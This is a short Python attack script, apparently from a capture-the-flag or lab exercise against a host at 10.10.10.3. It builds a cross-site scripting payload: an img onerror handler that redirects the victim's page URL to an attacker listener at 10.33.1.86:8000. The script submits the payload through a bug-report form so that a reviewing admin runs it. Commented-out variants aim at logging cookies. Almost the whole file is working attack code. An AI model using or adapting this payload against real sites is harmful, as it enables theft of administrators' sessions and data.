#!/usr/bin/env python3
import requests
import urllib.parse

myip = '10.33.1.86'
myport = 8000
# script = '<script>console.log(top.cookie)</script>'
# script = '<img src=x onerror="console.log(top.cookie)">'
# script = f'<a href="http://{myip}:{myport}/index.php?id=bugReport&from=">test</a>'
script = f'<img src="x" onerror="window.location.href=\'http://{myip}:{myport}?d=\'+window.location.href">'

payload = f'data:text/html;charset=utf-8,{script}'


s = requests.session()
resp = s.post('http://10.10.10.3/bugReport.php',
              data={'url': f'http://10.10.10.3/?debug=true&url={urllib.parse.quote(payload)}'})
if 'Thanks for your report! An admin will review your submission asap.' in resp.text:
    print("ok pending")
else:
    print('fail')
s.close()
